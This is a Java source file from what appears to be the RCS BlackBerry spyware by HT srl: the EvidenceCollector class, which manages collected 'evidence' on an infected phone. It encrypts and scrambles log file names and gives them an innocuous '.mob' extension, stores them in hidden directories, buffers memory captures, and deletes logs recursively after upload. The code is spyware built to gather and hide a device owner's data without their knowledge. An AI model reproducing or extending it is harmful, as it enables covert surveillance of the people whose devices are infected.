//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : LogCollector.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.evidence;

import java.io.IOException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.io.file.ExtendedFileConnection;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;
import net.rim.device.api.util.NumberUtilities;
import blackberry.Singleton;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.AutoFile;
import blackberry.fs.Path;
import blackberry.interfaces.iSingleton;
import blackberry.utils.DoubleStringSortVector;
import blackberry.utils.StringSortVector;

/**
 * The Class LogCollector.
 * 
 * @author zeno
 */
public final class EvidenceCollector implements iSingleton {
    //#ifdef DEBUG
    private static Debug debug = new Debug("EvidenceColl",
            DebugLevel.INFORMATION);
    //#endif

    static EvidenceCollector instance = null;

    public static final String LOG_EXTENSION = ".mob";

    public static final String LOG_DIR_PREFIX = "Z"; // Utilizzato per creare le
    // Log Dir
    public static final String LOG_DIR_FORMAT = "Z*"; // Utilizzato nella
    // ricerca delle Log Dir
    public static final int LOG_PER_DIRECTORY = 500; // Numero massimo di log
    // per ogni directory
    public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che
    // creeremo
    private static final long PERSISTENCE_KEY = 0x6f20a847b93765c8L; // Chiave

    private static final long GUID = 0x931be5a5253ec4cL;
    
    Vector memoryEvidences = new Vector();
    
    

    // arbitraria
    // di
    // accesso

    int seed;

    /**
     * Decrypt name.
     * 
     * @param logMask
     *            the log mask
     * @return the string
     */
    public static String decryptName(final String logMask) {
        return Encryption.decryptName(logMask, Encryption.getKeys()
                .getProtoKey()[0]);
    }

    /**
     * Encrypt name.
     * 
     * @param logMask
     *            the log mask
     * @return the string
     */
    public static String encryptName(final String logMask) {
        return Encryption.encryptName(logMask, Encryption.getKeys()
                .getProtoKey()[0]);
    }

    /**
     * Gets the single instance of LogCollector.
     * 
     * @return single instance of LogCollector
     */
    public static synchronized EvidenceCollector getInstance() {
        if (instance == null) {
            instance = (EvidenceCollector) Singleton.self().get(GUID);
            if (instance == null) {
                final EvidenceCollector singleton = new EvidenceCollector();
                singleton.initKeys();
                singleton.initProgressive();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    public void initKeys() {
        byte[] proto = keys.getProtoKey();
        seed = proto[0];
    }

    private void initProgressive() {
        logProgressive = deserializeProgressive();
    }

    // public boolean storeToMMC;
    Vector logVector;

    private int logProgressive;

    private PersistentObject logProgressivePersistent;

    Keys keys;

    /**
     * Instantiates a new log collector.
     * 
     * @throws Exception
     */
    private EvidenceCollector() {
        super();
        logVector = new Vector();

        keys = Encryption.getKeys();
    }

    private void clear() {

    }

    public synchronized void removeProgressive() {
        //#ifdef DEBUG
        debug.info("Removing Progressive");
        //#endif
        PersistentStore.destroyPersistentObject(PERSISTENCE_KEY);
    }

    private synchronized int deserializeProgressive() {
        logProgressivePersistent = PersistentStore
                .getPersistentObject(PERSISTENCE_KEY);
        final Object obj = logProgressivePersistent.getContents();

        if (obj == null) {
            //#ifdef DEBUG
            debug.info("First time of logProgressivePersistent");
            //#endif
            logProgressivePersistent.setContents(new Integer(1));
        }
        int logProgressiveRet = 0;

        try {
            logProgressiveRet = ((Integer) logProgressivePersistent
                    .getContents()).intValue();
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            debug.error("First time of logProgressivePersistent");
            //#endif
            logProgressivePersistent.setContents(new Integer(1));
        }

        return logProgressiveRet;
    }

    /**
     * Gets the new progressive.
     * 
     * @return the new progressive
     */
    protected synchronized int getNewProgressive() {
        logProgressive++;
        logProgressivePersistent.setContents(new Integer(logProgressive));

        //#ifdef DEBUG
        debug.trace("Progressive: " + logProgressive);

        //#endif
        return logProgressive;
    }

    private static String makeDateName(final Date date) {
        final long millis = date.getTime();
        final long mask = (long) 1E4;
        final int lodate = (int) (millis % mask);
        final int hidate = (int) (millis / mask);

        final String newname = NumberUtilities.toString(lodate, 16, 4)
                + NumberUtilities.toString(hidate, 16, 8);

        return newname;
    }

    /**
     * Make new name.
     * 
     * @param log
     *            the log
     * @param agent
     *            the agent
     * @return the vector
     */
    public Vector makeNewName(final Evidence log,
            final String logType, final boolean onSD) {
        final Date timestamp = log.timestamp;
        final int progressive = getNewProgressive();

        //#ifdef DBC
        Check.asserts(progressive >= 0, "makeNewName fail progressive >=0");
        //#endif

        final Vector vector = new Vector();
        final String basePath = Path.logs();

        final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);

        // http://www.rgagnon.com/javadetails/java-0021.html
        final String mask = "0000";
        final String ds = Long.toString(progressive % 10000); // double to string
        final int size = mask.length() - ds.length();
        //#ifdef DBC
        Check.asserts(size >= 0, "makeNewName: failed size>0");
        //#endif

        final String paddedProgressive = mask.substring(0, size) + ds;

        final String fileName = paddedProgressive + "" + logType + ""
                + makeDateName(timestamp);

        final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
                seed);

        //#ifdef DBC
        Check.asserts(!encName.endsWith("MOB"), "makeNewName: " + encName
                + " ch: " + seed + " not scrambled: " + fileName
                + LOG_EXTENSION);
        //#endif

        vector.addElement(new Integer(progressive));
        vector.addElement(basePath); // file:///SDCard/BlackBerry/system/$RIM313/$1
        vector.addElement(blockDir); // 1
        vector.addElement(encName); // ?
        vector.addElement(fileName); // unencrypted file
        return vector;
    }

    /**
     * Removes the.
     * 
     * @param logName
     *            the log name
     */
    public void remove(final String logName) {
        //#ifdef DEBUG
        debug.trace("Removing file: " + logName);
        //#endif
        final AutoFile file = new AutoFile(logName, false);
        if (file.exists()) {
            file.delete();
        } else {
            //#ifdef DEBUG
            debug.warn("File doesn't exists: " + logName);
            //#endif
        }
    }

    /**
     * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
     */

    public synchronized int removeLogDirs(int numFiles) {
        //#ifdef DEBUG
        debug.info("removeLogDirs");
        //#endif

        int removed = 0;

        removed = removeLogRecursive(Path.hidden(), numFiles - removed);
        return removed;
    }

    private int removeLogRecursive(final String basePath, int numFiles) {

        //#ifdef DEBUG
        debug.info("RemovingLog: " + basePath + " numFiles: " + numFiles);
        //#endif

        //#ifdef DBC
        Check.requires(!basePath.startsWith("file://"),
                "basePath shouldn't start with file:// : " + basePath);
        //#endif

        int numLogsDeleted = 0;

        FileConnection fc;
        try {
            fc = (FileConnection) Connector.open("file://" + basePath);

            if (fc.isDirectory()) {
                final Enumeration fileLogs = fc.list("*", true);

                while (fileLogs.hasMoreElements()) {
                    final String file = (String) fileLogs.nextElement();

                    //#ifdef DEBUG
                    debug.trace("removeLog: " + file);

                    //#endif
                    int removed = removeLogRecursive(basePath + file, numFiles
                            - numLogsDeleted);
                    //#ifdef DEBUG
                    debug.trace("removeLog removed: " + removed);
                    //#endif

                    numLogsDeleted += removed;
                }
            }

            fc.delete();
            numLogsDeleted += 1;

            fc.close();

        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("removeLog: " + basePath + " ex: " + e);
            //#endif
        }

        //#ifdef DEBUG
        debug.trace("removeLogRecursive removed: " + numLogsDeleted);
        //#endif
        return numLogsDeleted;

    }

    /**
     * Restituisce la lista ordinata secondo il nome.
     * 
     * @param currentPath
     *            the current path
     * @return the vector
     */
    public Vector scanForDirLogs(final String currentPath) {
        //#ifdef DBC
        Check.requires(currentPath != null, "null argument");
        Check.requires(!currentPath.startsWith("file://"),
                "currentPath shouldn't start with file:// : " + currentPath);
        //#endif

        final StringSortVector vector = new StringSortVector();
        FileConnection fc;

        try {
            fc = (FileConnection) Connector.open("file://" + currentPath);

            if (fc.isDirectory()) {
                final Enumeration fileLogs = fc.list(Path.LOG_DIR_BASE + "*",
                        true);

                while (fileLogs.hasMoreElements()) {
                    final String dir = (String) fileLogs.nextElement();
                    // scanForLogs(dir);
                    // return scanForLogs(file);
                    vector.addElement(dir);
                    //#ifdef DEBUG
                    debug.trace("scanForDirLogs adding: " + dir);
                    //#endif

                }

                vector.reSort();
            } else {
                //#ifdef DEBUG
                debug.error("scanForDirLogs, not a directory: " + currentPath);
                //#endif
            }

            fc.close();

        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("scanForDirLogs: " + e);
            //#endif

        }

        //#ifdef DEBUG
        debug.trace("scanForDirLogs #: " + vector.size());

        //#endif

        return vector;
    }

    /**
     * Estrae la lista di log nella forma *.MOB dentro la directory specificata
     * da currentPath, nella forma 1_n Restituisce la lista ordinata secondo il
     * nome demangled
     * 
     * @param currentPath
     *            the current path
     * @param dir
     *            the dir
     * @return the vector
     */
    public Vector scanForEvidences(final String currentPath, final String dir) {
        //#ifdef DBC
        Check.requires(currentPath != null, "null argument");
        Check.requires(!currentPath.startsWith("file://"),
                "currentPath shouldn't start with file:// : " + currentPath);
        //#endif

        final DoubleStringSortVector vector = new DoubleStringSortVector();

        ExtendedFileConnection fcDir = null;
        // FileConnection fcFile = null;
        try {
            fcDir = (ExtendedFileConnection) Connector.open("file://"
                    + currentPath + dir);

            if (fcDir.isDirectory()) {

                //#ifdef DEBUG
                debug.trace("scanForEvidences " + currentPath + dir + " size:"
                        + fcDir.directorySize(false));
                //#endif
                final Enumeration fileLogs = fcDir.list("*", true);

                while (fileLogs.hasMoreElements()) {
                    final String file = (String) fileLogs.nextElement();

                    // fcFile = (FileConnection) Connector.open(fcDir.getURL() +
                    // file);
                    // e' un file, vediamo se e' un file nostro
                    final String logMask = EvidenceCollector.LOG_EXTENSION;
                    final String encLogMask = encryptName(logMask);

                    if (file.endsWith(encLogMask)
                            || file.endsWith(encLogMask + ".rem")) {
                        // String encName = fcFile.getName();
                        //#ifdef DEBUG
                        debug.trace("enc name: " + file);
                        //#endif
                        final String plainName = decryptName(file);
                        //#ifdef DEBUG
                        debug.trace("plain name: " + plainName);
                        //#endif

                        vector.addElement(plainName, file);
                    }
                }
            } else {
                //#ifdef DEBUG                
                debug.error("scanForEvidences, not a directory: " + currentPath
                        + " / " + dir);
                //#endif
            }

        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("scanForEvidences: " + e);
            //#endif

        } finally {
            if (fcDir != null) {
                try {
                    fcDir.close();
                } catch (final IOException e) {
                    //#ifdef DEBUG
                    debug.error("scanForEvidences: " + e);
                    //#endif
                }
            }
        }

        //#ifdef DEBUG
        debug.trace("scanForEvidences numDirs: " + vector.size());

        //#endif
        return vector.getValues();
    }

    //
    /**
     * Init logs.
     */
    public void initEvidences() {
        clear();

        if (!Path.isInizialized()) {
            Path.makeDirs();
        }

    }

    public void appendMemoryEvidence(byte[] memory) {
        if(memoryEvidences == null){
            memoryEvidences = new Vector();
        }
        
        if(memoryEvidences.size() > 8) {
            memoryEvidences.removeElementAt(0);
        }    
        memoryEvidences.addElement(memory);
        
        //#ifdef DEBUG
        debug.trace("appendMemoryEvidence, size: " + memoryEvidences.size());
        //#endif
        
    }

    public Vector getMemoryEvidences() {
        Vector v = memoryEvidences;
        memoryEvidences = new Vector();
        return v;
    }

}
